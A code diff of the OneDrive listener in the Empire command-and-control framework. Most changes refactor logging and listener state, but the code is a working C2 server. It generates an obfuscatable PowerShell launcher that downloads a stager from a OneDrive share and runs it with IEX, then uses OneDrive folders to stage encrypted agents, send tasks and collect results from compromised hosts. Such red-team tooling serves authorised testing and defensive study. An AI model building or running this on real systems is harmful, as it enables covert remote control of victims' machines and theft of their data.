@@ -1,27 +1,35 @@
-from __future__ import print_function
-
 import base64
 import copy
-import json
+import logging
 import os
 import re
 import time
-import traceback
 from builtins import object, str
-from typing import List
+from typing import List, Optional, Tuple
 
-from pydispatch import dispatcher
 from requests import Request, Session
 
 from empire.server.common import encryption, helpers, templating
-from empire.server.utils import data_util, listener_util
+from empire.server.common.empire import MainMenu
+from empire.server.core.db.base import SessionLocal
+from empire.server.utils import data_util, listener_util, log_util
+from empire.server.utils.module_util import handle_validate_message
+
+LOG_NAME_PREFIX = __name__
+log = logging.getLogger(__name__)
 
 
 class Listener(object):
-    def __init__(self, mainMenu, params=[]):
+    def __init__(self, mainMenu: MainMenu, params=[]):
         self.info = {
             "Name": "Onedrive",
-            "Author": ["@mr64bit"],
+            "Authors": [
+                {
+                    "Name": "",
+                    "Handle": "@mr64bit",
+                    "Link": "",
+                }
+            ],
             "Description": (
                 "Starts a Onedrive listener. Setup instructions here:        gist.github.com/mr64bit/3fd8f321717c9a6423f7949d494b6cd9"
             ),
@@ -29,6 +37,9 @@ class Listener(object):
             "Comments": [
                 "Note that deleting STAGE0-PS.txt from the staging folder will break existing launchers"
             ],
+            "Software": "",
+            "Techniques": [],
+            "Tactics": [],
         }
 
         self.options = {
@@ -49,7 +60,7 @@ class Listener(object):
             },
             "AuthCode": {
                 "Description": "Auth code given after authenticating OAuth App.",
-                "Required": True,
+                "Required": False,
                 "Value": "",
             },
             "BaseFolder": {
@@ -134,6 +145,8 @@ class Listener(object):
             },
         }
 
+        self.stager_url = ""
+
         self.mainMenu = mainMenu
         self.threads = {}
 
@@ -141,10 +154,12 @@ class Listener(object):
             data_util.get_config("staging_key")[0]
         )
 
+        self.instance_log = log
+
     def default_response(self):
         return ""
 
-    def validate_options(self):
+    def validate_options(self) -> Tuple[bool, Optional[str]]:
 
         self.uris = [
             a.strip("/")
@@ -156,8 +171,9 @@ class Listener(object):
             str(self.options["AuthCode"]["Value"]).strip() == ""
         ):
             if str(self.options["ClientID"]["Value"]).strip() == "":
-                print(helpers.color("[!] ClientID needed to generate AuthCode URL!"))
-                return "[!] ClientID needed to generate AuthCode URL!"
+                return handle_validate_message(
+                    "[!] ClientID needed to generate AuthCode URL!"
+                )
             params = {
                 "client_id": str(self.options["ClientID"]["Value"]).strip(),
                 "response_type": "code",
@@ -170,28 +186,18 @@ class Listener(object):
                 params=params,
             )
             prep = req.prepare()
-            print(
-                helpers.color(
-                    '[*] Get your AuthCode from "%s" and try starting the listener again.'
-                    % prep.url
-                )
+            # TODO Do we need to differentiate between the two-step creation message and an error?
+            return handle_validate_message(
+                f'[*] Get your AuthCode from "{prep.url}" and try starting the listener again.'
             )
-            return f'[*] Get your AuthCode from "{prep.url}" and try starting the listener again.'
 
-        for key in self.options:
-            if self.options[key]["Required"] and (
-                str(self.options[key]["Value"]).strip() == ""
-            ):
-                print(helpers.color('[!] Option "%s" is required.' % (key)))
-                return '[!] Option "%s" is required.' % (key)
-
-        return True
+        return True, None
 
     def generate_launcher(
         self,
         encode=True,
         obfuscate=False,
-        obfuscationCommand="",
+        obfuscation_command="",
         userAgent="default",
         proxy="default",
         proxyCreds="default",
@@ -204,20 +210,19 @@ class Listener(object):
         bypasses = [] if bypasses is None else bypasses
 
         if not language:
-            print(
-                helpers.color(
-                    "[!] listeners/onedrive generate_launcher(): No language specified"
-                )
-            )
+            log.error("listeners/onedrive generate_launcher(): No language specified")
+            return None
 
+        # Previously, we had to do a lookup for the listener and check through threads on the instance.
+        # Beginning in 5.0, each instance is unique, so using self should work. This code could probably be simplified
+        # further, but for now keeping as is since 5.0 has enough rewrites as it is.
         if (
-            listenerName
-            and (listenerName in self.threads)
-            and (listenerName in self.mainMenu.listeners.activeListeners)
-        ):
-            listener_options = self.mainMenu.listeners.activeListeners[listenerName][
-                "options"
-            ]
+            True
+        ):  # The true check is just here to keep the indentation consistent with the old code.
+            active_listener = self
+            # extract the set options for this instantiated listener
+            listener_options = active_listener.options
+
             staging_key = listener_options["StagingKey"]["Value"]
             profile = listener_options["DefaultProfile"]["Value"]
             launcher_cmd = listener_options["Launcher"]["Value"]
@@ -283,7 +288,7 @@ class Listener(object):
                 # this is the minimized RC4 launcher code from rc4.ps1
                 launcher += listener_util.powershell_rc4()
 
-                launcher += f"$data=$wc.DownloadData('{ self.mainMenu.listeners.activeListeners[listenerName]['stager_url'] }');"
+                launcher += f"$data=$wc.DownloadData('{self.stager_url}');"
                 launcher += "$iv=$data[0..3];$data=$data[4..$data.length];"
                 launcher += "-join[Char[]](& $R $data ($IV+$K))|IEX"
 
@@ -292,33 +297,23 @@ class Listener(object):
                 launcher = data_util.ps_convert_to_oneliner(launcher)
 
                 if obfuscate:
-                    launcher = data_util.obfuscate(
-                        self.mainMenu.installPath,
+                    launcher = self.mainMenu.obfuscationv2.obfuscate(
                         launcher,
-                        obfuscationCommand=obfuscationCommand,
+                        obfuscation_command=obfuscation_command,
                     )
 
                 if encode and (
-                    (not obfuscate) or ("launcher" not in obfuscationCommand.lower())
+                    (not obfuscate) or ("launcher" not in obfuscation_command.lower())
                 ):
                     return helpers.powershell_launcher(launcher, launcher_cmd)
                 else:
                     return launcher
 
             if language.startswith("pyth"):
-                print(
-                    helpers.color(
-                        "[!] listeners/onedrive generate_launcher(): Python agent not implemented yet"
-                    )
+                log.error(
+                    "listeners/onedrive generate_launcher(): Python agent not implemented yet"
                 )
                 return "Python not implemented yet"
-
-        else:
-            print(
-                helpers.color(
-                    "[!] listeners/onedrive generate_launcher(): invalid listener name"
-                )
-            )
 
     def generate_stager(
         self, listenerOptions, encode=False, encrypt=True, language=None, token=None
@@ -328,11 +323,7 @@ class Listener(object):
         """
 
         if not language:
-            print(
-                helpers.color(
-                    "[!] listeners/onedrive generate_stager(): no language specified"
-                )
-            )
+            log.error("listeners/onedrive generate_stager(): no language specified")
             return None
 
         client_id = listenerOptions["ClientID"]["Value"]
@@ -375,7 +366,7 @@ class Listener(object):
             stager = template.render(template_options)
 
             # Get the random function name generated at install and patch the stager with the proper function name
-            stager = data_util.keyword_obfuscation(stager)
+            stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
             unobfuscated_stager = listener_util.remove_lines_comments(stager)
 
             if encode:
@@ -390,7 +381,7 @@ class Listener(object):
                 return unobfuscated_stager
 
         else:
-            print(helpers.color("[!] Python agent not available for Onedrive"))
+            log.error("Python agent not available for Onedrive")
 
     def generate_comms(
         self,
@@ -435,17 +426,11 @@ class Listener(object):
                 return comms
 
             else:
-                print(
-                    helpers.color(
-                        "[!] listeners/onedrive generate_comms(): invalid language specification, only 'powershell' is currently supported for this module."
-                    )
+                log.error(
+                    "listeners/onedrive generate_comms(): invalid language specification, only 'powershell' is currently supported for this module."
                 )
         else:
-            print(
-                helpers.color(
-                    "[!] listeners/onedrive generate_comms(): no language specified!"
-                )
-            )
+            log.error("listeners/onedrive generate_comms(): no language specified!")
 
     def generate_agent(
         self,
@@ -463,11 +448,7 @@ class Listener(object):
         """
 
         if not language:
-            print(
-                helpers.color(
-                    "[!] listeners/onedrive generate_agent(): No language specified"
-                )
-            )
+            log.error("listeners/onedrive generate_agent(): No language specified")
             return
 
         language = language.lower()
@@ -484,7 +465,7 @@ class Listener(object):
             agent_code = f.read()
             f.close()
 
-            agent_code = data_util.keyword_obfuscation(agent_code)
+            agent_code = self.mainMenu.obfuscationv2.obfuscate_keywords(agent_code)
 
             agent_code = helpers.strip_powershell_comments(agent_code)
 
@@ -516,6 +497,9 @@ class Listener(object):
             return agent_code
 
     def start_server(self, listenerOptions):
+        self.instance_log = log_util.get_listener_logger(
+            LOG_NAME_PREFIX, self.options["Name"]["Value"]
+        )
 
         # Utility functions to handle auth tasks and initial setup
         def get_token(client_id, client_secret, code):
@@ -537,15 +521,9 @@ class Listener(object):
                 r_token["update"] = True
                 return r_token
             except KeyError as e:
-                print(
-                    helpers.color(
-                        "[!] Something went wrong, HTTP response %d, error code %s: %s"
-                        % (
-                            r.status_code,
-                            r.json()["error_codes"],
-                            r.json()["error_description"],
-                        )
-                    )
+                log.error(
+                    f"{listener_name} Something went wrong, HTTP response {r.status_code:d}, error code {r.json()['error_codes']}: {r.json()['error_description']}",
+                    exc_info=True,
                 )
                 raise
 
@@ -568,15 +546,9 @@ class Listener(object):
                 r_token["update"] = True
                 return r_token
             except KeyError as e:
-                print(
-                    helpers.color(
-                        "[!] Something went wrong, HTTP response %d, error code %s: %s"
-                        % (
-                            r.status_code,
-                            r.json()["error_codes"],
-                            r.json()["error_description"],
-                        )
-                    )
+                log.error(
+                    f"{listener_name}: Something went wrong, HTTP response {r.status_code:d}, error code {r.json()['error_codes']}: {r.json()['error_description']}",
+                    exc_info=True,
                 )
                 raise
 
@@ -594,7 +566,9 @@ class Listener(object):
 
             base_object = s.get("%s/drive/root:/%s" % (base_url, base_folder))
             if not (base_object.status_code == 200):
-                print(helpers.color("[*] Creating %s folder" % base_folder))
+                self.instance_log.info(
+                    f"{listener_name}: Creating {base_folder} folder"
+                )
                 params = {
                     "@microsoft.graph.conflictBehavior": "rename",
                     "folder": {},
@@ -604,19 +578,17 @@ class Listener(object):
                     "%s/drive/items/root/children" % base_url, json=params
                 )
             else:
-                message = "[*] {} folder already exists".format(base_folder)
-                signal = json.dumps({"print": True, "message": message})
-                dispatcher.send(
-                    signal, sender="listeners/onedrive/{}".format(listener_name)
-                )
+                message = f"{listener_name}: {base_folder} folder already exists"
+                self.instance_log.info(message)
+                log.info(message)
 
             for item in [staging_folder, taskings_folder, results_folder]:
                 item_object = s.get(
                     "%s/drive/root:/%s/%s" % (base_url, base_folder, item)
                 )
                 if not (item_object.status_code == 200):
-                    print(
-                        helpers.color("[*] Creating %s/%s folder" % (base_folder, item))
+                    self.instance_log.info(
+                        f"{listener_name}: Creating {base_folder}/{item} folder"
                     )
                     params = {
                         "@microsoft.graph.conflictBehavior": "rename",
@@ -629,11 +601,9 @@ class Listener(object):
                         json=params,
                     )
                 else:
-                    message = "[*] {}/{} already exists".format(base_folder, item)
-                    signal = json.dumps({"print": True, "message": message})
-                    dispatcher.send(
-                        signal, sender="listeners/onedrive/{}".format(listener_name)
-                    )
+                    message = f"{listener_name}: {base_folder}/{item} already exists"
+                    self.instance_log.info(message)
+                    log.info(message)
 
         def upload_launcher():
             ps_launcher = self.mainMenu.stagers.generate_launcher(
@@ -688,17 +658,11 @@ class Listener(object):
                     % r.json()["shareId"]
                 )
                 # Different domain for some reason?
-                self.mainMenu.listeners.activeListeners[listener_name][
-                    "stager_url"
-                ] = stager_url
+                self.stager_url = stager_url
 
             else:
-                print(helpers.color("[!] Something went wrong uploading stager"))
-                message = r.content
-                signal = json.dumps({"print": True, "message": message})
-                dispatcher.send(
-                    signal, sender="listeners/onedrive/{}".format(listener_name)
-                )
+                message = f"{listener_name}: Something went wrong uploading stager. {r.content}"
+                self.instance_log.error(message)
 
         listener_options = copy.deepcopy(listenerOptions)
 
@@ -720,21 +684,19 @@ class Listener(object):
 
         if refresh_token:
             token = renew_token(client_id, client_secret, refresh_token)
-            message = "[*] Refreshed auth token"
-            signal = json.dumps({"print": True, "message": message})
-            dispatcher.send(
-                signal, sender="listeners/onedrive/{}".format(listener_name)
-            )
+            message = f"{listener_name}: Refreshed auth token"
+            self.instance_log.info(message)
         else:
             try:
                 token = get_token(client_id, client_secret, auth_code)
             except:
-                print(helpers.color("[!] Unable to retrieve OneDrive Token"))
+                self.instance_log.error(
+                    f"{listener_name}: Unable to retrieve OneDrive Token"
+                )
                 return
 
-            message = "[*] Got new auth token"
-            signal = json.dumps({"print": True, "message": message})
-            dispatcher.send(signal, sender="listeners/onedrive")
+            message = f"{listener_name} Got new auth token"
+            self.instance_log.info(message)
 
         s.headers["Authorization"] = "Bearer " + token["access_token"]
 
@@ -743,9 +705,7 @@ class Listener(object):
         while True:
             # Wait until Empire is aware the listener is running, so we can save our refresh token and stager URL
             try:
-                if listener_name in list(
-                    self.mainMenu.listeners.activeListeners.keys()
-                ):
+                if self.mainMenu.listenersv2.get_active_listener_by_name(listener_name):
                     upload_stager()
                     upload_launcher()
                     break
@@ -764,16 +724,17 @@ class Listener(object):
                         client_id, client_secret, token["refresh_token"]
                     )
                     s.headers["Authorization"] = "Bearer " + token["access_token"]
-                    message = "[*] Refreshed auth token"
-                    signal = json.dumps({"print": True, "message": message})
-                    dispatcher.send(
-                        signal, sender="listeners/onedrive/{}".format(listener_name)
-                    )
+                    message = f"{listener_name} Refreshed auth token"
+                    self.instance_log.info(message)
                     upload_stager()
                 if token["update"]:
-                    self.mainMenu.listeners.update_listener_options(
-                        listener_name, "RefreshToken", token["refresh_token"]
-                    )
+                    with SessionLocal.begin() as db:
+                        self.options["RefreshToken"]["Value"] = token["refresh_token"]
+                        db_listener = self.mainMenu.listenersv2.get_by_name(
+                            db, listener_name
+                        )
+                        db_listener.options = self.options
+
                     token["update"] = False
 
                 search = s.get(
@@ -789,57 +750,30 @@ class Listener(object):
                             continue
                         agent_name, stage = reg.groups()
                         if stage == "1":  # Download stage 1, upload stage 2
-                            message = "[*] Downloading {}/{}/{} {}".format(
-                                base_folder, staging_folder, item["name"], item["size"]
-                            )
-                            signal = json.dumps({"print": False, "message": message})
-                            dispatcher.send(
-                                signal,
-                                sender="listeners/onedrive/{}".format(listener_name),
-                            )
+                            message = f"{listener_name}: Downloading {base_folder}/{staging_folder}/{item['name']} {item['size']}"
+                            self.instance_log.info(message)
                             content = s.get(
                                 item["@microsoft.graph.downloadUrl"]
                             ).content
                             lang, return_val = self.mainMenu.agents.handle_agent_data(
                                 staging_key, content, listener_options
                             )[0]
-                            message = "[*] Uploading {}/{}/{}_2.txt, {} bytes".format(
-                                base_folder,
-                                staging_folder,
-                                agent_name,
-                                str(len(return_val)),
-                            )
-                            signal = json.dumps({"print": False, "message": message})
-                            dispatcher.send(
-                                signal,
-                                sender="listeners/onedrive/{}".format(listener_name),
-                            )
+                            message = f"{listener_name}: Uploading {base_folder}/{staging_folder}/{agent_name}_2.txt, {str(len(return_val))} bytes"
+                            self.instance_log.info(message)
                             s.put(
                                 "%s/drive/root:/%s/%s/%s_2.txt:/content"
                                 % (base_url, base_folder, staging_folder, agent_name),
                                 data=return_val,
                             )
-                            message = "[*] Deleting {}/{}/{}".format(
-                                base_folder, staging_folder, item["name"]
-                            )
-                            signal = json.dumps({"print": False, "message": message})
-                            dispatcher.send(
-                                signal,
-                                sender="listeners/onedrive/{}".format(listener_name),
-                            )
+                            message = f"{listener_name} Deleting {base_folder}/{staging_folder}/{item['name']}"
+                            self.instance_log.info(message)
                             s.delete("%s/drive/items/%s" % (base_url, item["id"]))
 
                         if (
                             stage == "3"
                         ):  # Download stage 3, upload stage 4 (full agent code)
-                            message = "[*] Downloading {}/{}/{}, {} bytes".format(
-                                base_folder, staging_folder, item["name"], item["size"]
-                            )
-                            signal = json.dumps({"print": False, "message": message})
-                            dispatcher.send(
-                                signal,
-                                sender="listeners/onedrive/{}".format(listener_name),
-                            )
+                            message = f"{listener_name}: Downloading {base_folder}/{staging_folder}/{item['name']}, {item['size']} bytes"
+                            self.instance_log.info(message)
                             content = s.get(
                                 item["@microsoft.graph.downloadUrl"]
                             ).content
@@ -864,48 +798,28 @@ class Listener(object):
                                     lang,
                                 )
                             )
+
+                            if lang.lower() in ["python", "ironpython"]:
+                                session_key = bytes.fromhex(session_key)
+
                             enc_code = encryption.aes_encrypt_then_hmac(
                                 session_key, agent_code
                             )
 
-                            message = "[*] Uploading {}/{}/{}_4.txt, {} bytes".format(
-                                base_folder,
-                                staging_folder,
-                                agent_name,
-                                str(len(enc_code)),
-                            )
-                            signal = json.dumps({"print": False, "message": message})
-                            dispatcher.send(
-                                signal,
-                                sender="listeners/onedrive/{}".format(listener_name),
-                            )
+                            message = f"{listener_name}: Uploading {base_folder}/{staging_folder}/{agent_name}_4.txt, {str(len(enc_code))} bytes"
+                            self.instance_log.info(message)
                             s.put(
                                 "%s/drive/root:/%s/%s/%s_4.txt:/content"
                                 % (base_url, base_folder, staging_folder, agent_name),
                                 data=enc_code,
                             )
-                            message = "[*] Deleting {}/{}/{}".format(
-                                base_folder, staging_folder, item["name"]
-                            )
-                            signal = json.dumps({"print": False, "message": message})
-                            dispatcher.send(
-                                signal,
-                                sender="listeners/onedrive/{}".format(listener_name),
-                            )
+                            message = f"{listener_name}: Deleting {base_folder}/{staging_folder}/{item['name']}"
+                            self.instance_log.info(message)
                             s.delete("%s/drive/items/%s" % (base_url, item["id"]))
 
                     except Exception as e:
-                        print(
-                            helpers.color(
-                                "[!] Could not handle agent staging for listener %s, continuing"
-                                % listener_name
-                            )
-                        )
-                        message = traceback.format_exc()
-                        signal = json.dumps({"print": False, "message": message})
-                        dispatcher.send(
-                            signal, sender="listeners/onedrive/{}".format(listener_name)
-                        )
+                        message = f"{listener_name}: Could not handle agent staging, continuing"
+                        self.instance_log.error(message, exc_info=True)
 
                 agent_ids = self.mainMenu.agents.get_agents_for_listener(listener_name)
 
@@ -926,16 +840,8 @@ class Listener(object):
                             ):  # If there's already something there, download and append the new data
                                 task_data = r.content + task_data
 
-                            message = (
-                                "[*] Uploading agent tasks for {}, {} bytes".format(
-                                    agent_id, str(len(task_data))
-                                )
-                            )
-                            signal = json.dumps({"print": False, "message": message})
-                            dispatcher.send(
-                                signal,
-                                sender="listeners/onedrive/{}".format(listener_name),
-                            )
+                            message = f"{listener_name}: Uploading agent tasks for {agent_id}, {str(len(task_data))} bytes"
+                            self.instance_log.info(message)
 
                             r = s.put(
                                 "%s/drive/root:/%s/%s/%s.txt:/content"
@@ -943,16 +849,8 @@ class Listener(object):
                                 data=task_data,
                             )
                         except Exception as e:
-                            message = (
-                                "[!] Error uploading agent tasks for {}, {}".format(
-                                    agent_id, e
-                                )
-                            )
-                            signal = json.dumps({"print": False, "message": message})
-                            dispatcher.send(
-                                signal,
-                                sender="listeners/onedrive/{}".format(listener_name),
-                            )
+                            message = f"{listener_name}: Error uploading agent tasks for {agent_id}, {e}"
+                            self.instance_log.error(message, exc_info=True)
 
                 search = s.get(
                     "%s/drive/root:/%s/%s?expand=children"
@@ -970,11 +868,8 @@ class Listener(object):
                         if (
                             not agent_id in agent_ids
                         ):  # If we don't recognize that agent, upload a message to restage
-                            print(
-                                helpers.color(
-                                    "[*] Invalid agent, deleting %s/%s and restaging"
-                                    % (results_folder, item["name"])
-                                )
+                            self.instance_log.info(
+                                f"{listener_name}: Invalid agent, deleting {results_folder}/{item['name']} and restaging"
                             )
                             s.put(
                                 "%s/drive/root:/%s/%s/%s.txt:/content"
@@ -988,16 +883,8 @@ class Listener(object):
 
                         # If the agent is just checking in, the file will only be 1 byte, so no results to fetch
                         if item["size"] > 1:
-                            message = (
-                                "[*] Downloading results from {}/{}, {} bytes".format(
-                                    results_folder, item["name"], item["size"]
-                                )
-                            )
-                            signal = json.dumps({"print": False, "message": message})
-                            dispatcher.send(
-                                signal,
-                                sender="listeners/onedrive/{}".format(listener_name),
-                            )
+                            message = f"{listener_name}: Downloading results from {results_folder}/{item['name']}, {item['size']} bytes"
+                            self.instance_log.info(message)
                             r = s.get(item["@microsoft.graph.downloadUrl"])
                             self.mainMenu.agents.handle_agent_data(
                                 staging_key,
@@ -1005,36 +892,16 @@ class Listener(object):
                                 listener_options,
                                 update_lastseen=True,
                             )
-                            message = "[*] Deleting {}/{}".format(
-                                results_folder, item["name"]
-                            )
-                            signal = json.dumps({"print": False, "message": message})
-                            dispatcher.send(
-                                signal,
-                                sender="listeners/onedrive/{}".format(listener_name),
-                            )
+                            message = f"{listener_name}: Deleting {results_folder}/{item['name']}"
+                            self.instance_log.info(message)
                             s.delete("%s/drive/items/%s" % (base_url, item["id"]))
                     except Exception as e:
-                        message = "[!] Error handling agent results for {}, {}".format(
-                            item["name"], e
-                        )
-                        signal = json.dumps({"print": False, "message": message})
-                        dispatcher.send(
-                            signal, sender="listeners/onedrive/{}".format(listener_name)
-                        )
+                        message = f"{listener_name}: Error handling agent results for {item['name']}, {e}"
+                        self.instance_log.error(message, exc_info=True)
 
             except Exception as e:
-                print(
-                    helpers.color(
-                        "[!] Something happened in listener %s: %s, continuing"
-                        % (listener_name, e)
-                    )
-                )
-                message = traceback.format_exc()
-                signal = json.dumps({"print": False, "message": message})
-                dispatcher.send(
-                    signal, sender="listeners/onedrive/{}".format(listener_name)
-                )
+                message = f"{listener_name}: Something happened in listener {listener_name}: {e}, continuing"
+                self.instance_log.error(message, exc_info=True)
 
             s.close()
 
@@ -1067,14 +934,11 @@ class Listener(object):
         Terminates the server thread stored in the self.threads dictionary,
         keyed by the listener name.
         """
-
         if name and name != "":
-            print(helpers.color("[!] Killing listener '%s'" % (name)))
-            self.threads[name].kill()
+            to_kill = name
         else:
-            print(
-                helpers.color(
-                    "[!] Killing listener '%s'" % (self.options["Name"]["Value"])
-                )
-            )
-            self.threads[self.options["Name"]["Value"]].kill()
+            to_kill = self.options["Name"]["Value"]
+
+        self.instance_log.info(f"{to_kill}: shutting down...")
+        log.info(f"{to_kill}: shutting down...")
+        self.threads[to_kill].kill()
